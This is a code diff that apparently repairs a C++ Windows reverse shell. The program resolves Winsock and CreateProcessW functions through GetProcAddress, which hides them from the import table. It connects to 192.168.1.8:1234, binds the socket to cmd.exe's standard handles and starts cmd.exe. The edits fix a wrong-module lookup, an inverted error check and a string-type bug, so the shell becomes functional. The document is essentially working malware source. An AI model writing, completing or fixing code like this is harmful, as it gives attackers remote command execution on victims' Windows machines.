@@ -28,16 +28,16 @@ using pWSAConnect = INT ( WSAAPI * ) (
   LPQOS
 );
 
-using pCreateProcessA = BOOL (WINAPI * ) (
-  LPCSTR,
-  LPSTR,
+using pCreateProcessW = BOOL ( WINAPI * ) (
+  LPCWSTR,
+  LPWSTR,
   LPSECURITY_ATTRIBUTES,
   LPSECURITY_ATTRIBUTES,
   BOOL,
   DWORD,
   LPVOID,
-  LPCSTR,
-  LPSTARTUPINFOA,
+  LPCWSTR,
+  LPSTARTUPINFOW,
   LPPROCESS_INFORMATION
 );
 
@@ -45,19 +45,19 @@ int main() {
   HMODULE Handle_Kernel32 = GetModuleHandleW ( L"kernel32.dll" );
   HMODULE Handle_WS2      = LoadLibraryW     ( L"ws2_32.dll"   );
 
-  pWSAStartup      dWSAStartup     = ( pWSAStartup     )  GetProcAddress  ( Handle_WS2,   "WSAStartup"     );
-  pWSASocketA      dWSASocketA     = ( pWSASocketA     )  GetProcAddress  ( Handle_WS2,   "WSASocketA"     );
-  pWSAConnect      dWSAConnect     = ( pWSAConnect     )  GetProcAddress  ( Handle_WS2,   "WSAConnect"     );
-  pCreateProcessA  dCreateProcessA = ( pCreateProcessA )  GetProcAddress  ( Handle_WS2,   "CreateProcessA" );
+  pWSAStartup      dWSAStartup     = ( pWSAStartup     ) GetProcAddress ( Handle_WS2,       "WSAStartup"     );
+  pWSASocketA      dWSASocketA     = ( pWSASocketA     ) GetProcAddress ( Handle_WS2,       "WSASocketA"     );
+  pWSAConnect      dWSAConnect     = ( pWSAConnect     ) GetProcAddress ( Handle_WS2,       "WSAConnect"     );
+  pCreateProcessW  dCreateProcessW = ( pCreateProcessW ) GetProcAddress ( Handle_Kernel32,  "CreateProcessW" );
   
   int port                   { 1234 };
-  std::string_view ipAddress { "192.168.1.3" }; 
+  std::string_view ipAddress { "192.168.1.8" }; 
 
   struct networking {
     WSADATA              wsaData;
     SOCKET               windowsSocket;
     struct sockaddr_in   socketAddress;
-    STARTUPINFOA         startupInformation;
+    STARTUPINFOW         startupInformation;
     PROCESS_INFORMATION  processInformation;
   } net;
 
@@ -90,7 +90,7 @@ int main() {
       NULL,
       NULL,
       NULL
-    ) != SOCKET_ERROR)
+    ) == SOCKET_ERROR)
 
   {
     std::cout << "Error M3:" << WSAGetLastError() << '\n';
@@ -105,9 +105,11 @@ int main() {
   net.startupInformation.hStdError  =       ( HANDLE ) net.windowsSocket;
   net.startupInformation.dwFlags    =               STARTF_USESTDHANDLES;
 
-  if (!dCreateProcessA(
+  std::wstring cmd { L"cmd.exe" };
+
+  if (!dCreateProcessW(
     NULL,
-    ( LPSTR ) L"cmd.exe",
+    cmd.data(),
     NULL,
     NULL,
     TRUE,
@@ -119,7 +121,7 @@ int main() {
     ))
     
   {
-    std::cout << "Error M4:" << WSAGetLastError() << '\n';
+    std::cout << "Error M4:" << GetLastError() << '\n';
   }
 
   return EXIT_SUCCESS;
